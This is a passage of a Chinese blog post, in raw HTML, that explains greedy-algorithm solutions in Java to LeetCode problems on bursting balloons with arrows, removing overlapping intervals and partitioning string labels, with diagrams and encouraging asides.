class=\"token comment\">// 返回</span>\n        <span class=\"token keyword\">return</span> que<span class=\"token punctuation\">.</span><span class=\"token function\">toArray</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span>people<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p>加油加油！！<br> <img src=\"https://img-blog.csdnimg.cn/20210610231301407.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"12httpsleetcodecncomproblemsminimumnumberofarrowstoburstballoons_484\"></a><a href=\"https://leetcode-cn.com/problems/minimum-number-of-arrows-to-burst-balloons/\">12.用最少数量的箭引爆气球</a></h2> \n <blockquote> \n  <p>在二维空间中有许多球形的气球。对于每个气球，提供的输入是水平方向上，气球直径的开始和结束坐标。由于它是水平的，所以纵坐标并不重要，因此只要知道开始和结束的横坐标就足够了。开始坐标总是小于结束坐标。<br> 一支弓箭可以沿着 x 轴从不同点完全垂直地射出。在坐标 x 处射出一支箭，若有一个气球的直径的开始和结束坐标为 xstart，xend， 且满足 xstart ≤ x ≤ xend，则该气球会被引爆。可以射出的弓箭的数量没有限制。 弓箭一旦被射出之后，可以无限地前进。我们想找到使得所有气球全部被引爆，所需的弓箭的最小数量。<br> 给你一个数组 points ，其中 points [i] = [xstart,xend] ，返回引爆所有气球所必须射出的最小弓箭数。<br> <img src=\"https://img-blog.csdnimg.cn/20210609215725646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>: </font><br> <strong>问题分析</strong>：<br> 根据题目描述，想射穿越多的气球，肯定要在气球最密集的地方射箭啦：看下面这张图：<br> <img src=\"https://img-blog.csdnimg.cn/20210610081954900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 图中这一支箭射了4个，如何来找到这么一支箭呢？我们先人肉模拟一下这个过程，见下面这个图：<br> <img src=\"https://img-blog.csdnimg.cn/20210610082246901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 在起点这里可以保证射穿1个，然后继续向右边扫描<br> <img src=\"https://img-blog.csdnimg.cn/202106100823425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 在<strong>第一个气球的范围</strong>内可以射到第二个了！继续向右扫描<br> <img src=\"https://img-blog.csdnimg.cn/20210610082516810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><img src=\"https://img-blog.csdnimg.cn/20210610082546553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 找到解啦～，回顾我们的扫描过程，我们是如何扫描的？我们在第一个碰到的气球的屁股的范围内一直扫描，将碰到的气球都射穿，之后在化归到起始步骤就可以咯，这就是我们的贪心策略。那么如何操作呢？首先将气球按照气球的终点进行排序，这样，我们遍历的时候，就可以对第一个气球终点之前的气球进行操作了。如果下一个气球的起点超过了第一个气球的终点，说明无法一支箭射穿，弓箭数量++，更新下一支箭的位置。<br> <strong>问题抽象：</strong><br> 将气球按照气球屁股的位置进行排序。从头开始扫描，在每个屁股的范围内射穿尽可能多的气球，超过第一个气球的范围就更新箭的位置和数量。<br> <strong>实现步骤：</strong><br> 1、根据气球的终点位置升序排序。<br> 2、确定第一支箭的位置。<br> 3、扫描气球，通过起始位置，更新下一支箭范围。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">findMinArrowShots</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> points<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">int</span> n <span class=\"token operator\">=</span> points<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">,</span> ans <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 根据终点位置排序</span>\n        <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">sort</span><span class=\"token punctuation\">(</span>points<span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Comparator</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">compare</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> point1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> point2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>point1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;</span> point2<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                    <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>point1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> point2<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 第一支箭在屁股最靠前的第一个气球的屁股上</span>\n        <span class=\"token keyword\">int</span> arrow <span class=\"token operator\">=</span> points<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        	<span class=\"token comment\">// 如果后面的气球的头在前面气球屁股的后面，就更新</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>points<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;</span> arrow<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                ans <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// 下一个箭更新到下一个气球的屁股</span>\n                arrow <span class=\"token operator\">=</span> points<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p><strong>你八成能拿下所有贪心的题目了！</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210610225301730.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"13httpsleetcodecncomproblemsnonoverlappingintervals_539\"></a><a href=\"https://leetcode-cn.com/problems/non-overlapping-intervals/\">13.无重叠区间</a></h2> \n <blockquote> \n  <p>给定一个区间的集合，找到需要移除区间的最小数量，使剩余区间互不重叠。<br> 注意:<br> 1、可以认为区间的终点总是大于它的起点。<br> 2、区间 [1,2] 和 [2,3] 的边界相互“接触”，但没有相互重叠。<br> <img src=\"https://img-blog.csdnimg.cn/20210609221315375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>: </font><br> <strong>问题分析</strong>：<br> 这道题和上一道题很类似。依然是通过区间终点来进行升序排序。至于为什么这么做，这就涉及到数学中对这个问题进行严格的推理和归纳总结了。有兴趣的小伙伴自己下去进行尝试叭～ 可以将结果分享在评论区哦～ 只需要记住，很多区间类的贪心策略都是根据区间的终点进行升序排序的就好。排序完扫描如果遇到下一个区间的起点在上一个区间终点的前面就把这个去掉并统计，如果下一个区间的起点在上一个区间终点的后面，就更新后面的区间终点为最新的“屁股”。画个图来理解一下：<br> <img src=\"https://img-blog.csdnimg.cn/20210610090842840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <strong>问题抽象：</strong><br> 根据区间终点的位置进行升序排序，根据下一个区间的起点更新答案。<br> <strong>实现步骤：</strong><br> 1、根据区间终点的位置进行升序排序。<br> 2、确定第一个区间的终点位置。<br> 3、扫描区间，如果后面区间的起点在前面区间的终点之前就去掉，更新答案。<br> 4、如果后面的起点在前面终点的后面，就更新起点。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">eraseOverlapIntervals</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> intervals<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    	<span class=\"token comment\">// 根据区间的屁股进行升序排序</span>\n        <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">sort</span><span class=\"token punctuation\">(</span>intervals<span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Comparator</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">compare</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> interval1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> interval2<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>interval1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;</span> interval2<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>interval2<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;</span> interval1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">else</span> <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 去掉的区间的数量</span>\n        <span class=\"token keyword\">int</span> count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 第一个区间的终点位置</span>\n        <span class=\"token keyword\">int</span> right <span class=\"token operator\">=</span> intervals<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> intervals<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        	<span class=\"token comment\">// 如果下一个区间起点在上一个区间终点之前就去掉</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>intervals<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> right<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                count <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            	<span class=\"token comment\">// 下一个区间起点在上一个区间终点后面就更新</span>\n                right <span class=\"token operator\">=</span> intervals<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> count<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p><strong>继续坚持！</strong><img src=\"https://img-blog.csdnimg.cn/20210610225338185.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"14httpsleetcodecncomproblemspartitionlabels_588\"></a><a href=\"https://leetcode-cn.com/problems/partition-labels/\">14.划分字母区间</a></h2> \n <blockquote> \n  <p>字符串 S 由小写字母组成。我们要把这个字符串划分为尽可能多的片段，同一字母最多出现在一个片段中。返回一个表示每个字符串片段的长度的列表。<br> <img src=\"https://img-blog.csdnimg.cn/20210610065034431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>: </font><br> <strong>问题分析</strong>：<br> 这道题如果按照贪心的做法的话和青蛙跳台阶类似。首先我们可以对每个字母最后出现的位置进行存储。在遍历的时候更新已经遍历过的字母出现的最远位置，如果到了最远的位置就说明后面没有在出现前面的字母了，画个图理解一下：<br> <img src=\"https://img-blog.csdnimg.cn/20210610092727201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 后面同理，不画了，框框太多画脑溢血了。遍历的时候更新findLast字典，里面存储每个字母最后出现的位置。然后将最后出现的位置设置为第一区见遍历的最远位置，后续在遍历这个区间的时候对这个最远位置进行更新，如果标针 <code>i</code> 到达了最远位置，说明前面的字符在后面字符中没有出现， 化归这个过程。<br> <strong>问题抽象：</strong><br> 第一次遍历：更新findLast字典，第二次遍历：更新当前区间最远边界如果满足标针到达区间终点，将长度加入结果集。<br> <strong>实现步骤：</strong><br> 1、遍历更新findLast字典。<br> 2、遍历寻找每个区间的最远边界。<br> 3、判断是否到达了最远边界。如果到达最远边界，就加入结果集。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token function\">partitionLabels</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> findLast <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token number\">26</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">&gt;</span></span> ans <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 遍历更新findLast字典</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">char</span> c <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            findLast<span class=\"token punctuation\">[</span>c <span class=\"token operator\">-</span> <span class=\"token string\">\'a\'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">// 初始化起点区间</span>\n        <span class=\"token keyword\">int</span> left <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> right <span class=\"token operator\">=</span> findLast<span class=\"token punctuation\">[</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token string\">\'a\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 遍历更新最远边界</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">char</span> c <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 更新最远边界</span>\n            right <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>right<span class=\"token punctuation\">,</span> findLast<span class=\"token punctuation\">[</span>c <span class=\"token operator\">-</span> <span class=\"token string\">\'a\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 到达最远边界 加入结果集</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> right<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                ans<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>right <span class=\"token operator\">-</span> left <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// 更新下一个区间的起点</span>\n                left <span class=\"token operator\">=</span> right <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <p><font color=\"#00f\"><strong>特殊解法：</strong></font></p> \n <blockquote> \n  <p>当然这道题我在一开始做的时候想到的方法并不是贪心，而是倒序遍历的方式，我搜了搜，<strong>官方解答以及大家都没有给出这个解法，大概是自己第一个发现的叭</strong>，嘿嘿嘿， 结果耗时和贪心耗时一样都是5ms。思路就是倒序遍历。通过hash数组存储每个字符的数量。在遍历的时候判断，如果遍历过的区间每个字符的数量都减到0了，就返回这个长度。<br> 噫？ 突然发现正序好像也能实现 … 好叭，时间复杂度其实是比贪心多的，因为每次要遍历字符串不过还好，最差是O(n2).代码贴下去了，感兴趣自己看一看，<strong>没有用到贪心</strong>。给出了<strong>详细的注释</strong>。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token function\">partitionLabels</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> hash <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 存储每个字符的数量</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">char</span> c <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            hash<span class=\"token punctuation\">[</span>c <span class=\"token operator\">-</span> <span class=\"token string\">\'0\'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">// 存在双端队列中</span>\n        <span class=\"token class-name\">Deque</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">&gt;</span></span> ans <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LinkedList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> right <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 倒叙遍历</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&gt;=</span><span class=\"token number\">0</span> <span class=\"token punctuation\">;</span> i <span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">char</span> c <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 减去字符的数量</span>\n            hash<span class=\"token punctuation\">[</span>c <span class=\"token operator\">-</span> <span class=\"token string\">\'0\'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// 如果满足区间数量字符的个数都为0</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">checkAdd</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> hash<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> right<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            	<span class=\"token comment\">// 加入结果集</span>\n                ans<span class=\"token punctuation\">.</span><span class=\"token function\">offerFirst</span><span class=\"token punctuation\">(</span>right <span class=\"token operator\">-</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                right <span class=\"token operator\">=</span> i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token 